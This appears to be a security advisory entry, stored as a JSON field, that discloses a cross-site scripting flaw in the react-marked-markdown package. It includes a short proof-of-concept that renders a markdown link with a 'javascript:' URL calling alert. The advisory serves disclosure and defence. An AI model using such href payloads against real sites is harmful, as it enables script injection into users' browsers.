    "Description": "All versions of `react-marked-markdown` are vulnerable to cross-site scripting (XSS) via `href` attributes. This is exploitable if user is provided to `react-marked-markdown`\n\nProof of concept:\n\n```\nimport React from 'react'\nimport ReactDOM from 'react-dom'\nimport { MarkdownPreview } from 'react-marked-markdown'\n\nReactDOM.render(\n\u003cMarkdownPreview\nmarkedOptions={{ sanitize: true }}\nvalue={'[XSS](javascript: alert`1`)'}\n/\u003e,\ndocument.getElementById('root')\n)\n```\n\n\n## Recommendation\n\nNo fix is currently available for this vulnerability. It is our recommendation to not install or use this module at this time if you allow user input into href values.\n",
